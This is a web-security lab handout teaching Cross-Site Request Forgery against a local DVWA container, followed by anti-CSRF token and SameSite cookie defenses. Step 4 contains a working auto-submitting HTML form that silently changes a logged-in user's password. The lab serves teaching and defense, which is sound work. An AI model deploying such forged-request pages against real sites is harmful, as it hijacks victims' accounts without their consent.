# Lab 6: Cross-Site Request Forgery (CSRF) Attack and Defense

**Module:** 5 – Web Security and Application Protection
**Unit:** 2 – Web Application Security
**Estimated Duration:** 60–75 minutes
**Difficulty:** Intermediate

## Objective
Demonstrate a CSRF attack that forces an authenticated user's browser to perform an unwanted action, then implement anti-CSRF tokens as a defense.

## Prerequisites
- Completion of Lab 5
- Understanding of how session cookies authenticate requests

## Tools Required
- DVWA (Docker)
- A simple text editor to craft a malicious HTML page
- Browser with developer tools

## Ethics & Safety Note
Perform this attack only against your own local DVWA instance. Never craft CSRF pages targeting real services.

## Step-by-Step Instructions

### Step 1: Deploy DVWA and Log In
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
Log in and set Security to **Low**.

### Step 2: Locate the CSRF Module
Navigate to **CSRF** in the DVWA menu. This module allows changing the account password via a simple GET request.

### Step 3: Observe the Vulnerable Request
1. Change your password using the form and note the URL structure, e.g.:
   ```
   http://localhost/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change#
   ```
2. Note that the request contains no unique, unpredictable token tying it to your session.

### Step 4: Craft a Malicious HTML Page
Create a file `csrf_attack.html` with the following content:
```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked123">
      <input type="hidden" name="password_conf" value="hacked123">
      <input type="hidden" name="Change" value="Change">
    </form>
  </body>
</html>
```

### Step 5: Execute the Attack
1. While still logged into DVWA in the same browser, open `csrf_attack.html` in a new tab.
2. The form auto-submits using your existing session cookie.
3. Attempt to log in again with the original password — observe that it now fails, confirming the password was changed without your explicit consent on the actual site.

### Step 6: Identify the Root Cause
Explain that the browser automatically attaches the session cookie to any request to `localhost`, regardless of which page initiated it — the server cannot distinguish a legitimate request from a forged one.

### Step 7: Remediate with Anti-CSRF Tokens
Describe/implement the fix conceptually:
1. Server generates a unique, unpredictable token per session and embeds it as a hidden field:
   ```html
   <input type="hidden" name="csrf_token" value="a1b2c3d4...">
   ```
2. Server validates the token server-side on form submission; requests missing or with an invalid token are rejected.

### Step 8: Re-test at Higher Security Levels
Set DVWA Security to **Medium/High** and repeat Step 5. Document how the CSRF attack now fails because a valid token cannot be guessed by the attacker's page.

### Step 9: Discuss Additional Defenses
Document at least two more mitigations:
- `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Requiring re-authentication (password confirmation) for sensitive actions

### Step 10: Document Findings
Write a short report with the attack flow, impact, and remediation confirmed by retesting.

## Expected Outcome
Learners understand how CSRF abuses browser-stored credentials and can implement/explain token-based and SameSite-cookie defenses.

## Cleanup
- Stop the Docker container.
- Delete the `csrf_attack.html` file after the exercise.

## Review Questions
1. Why does CSRF rely on the victim being authenticated at the time of the attack?
2. How does a CSRF token prevent the forged request from succeeding?
3. Why doesn't HTTPS alone prevent CSRF?
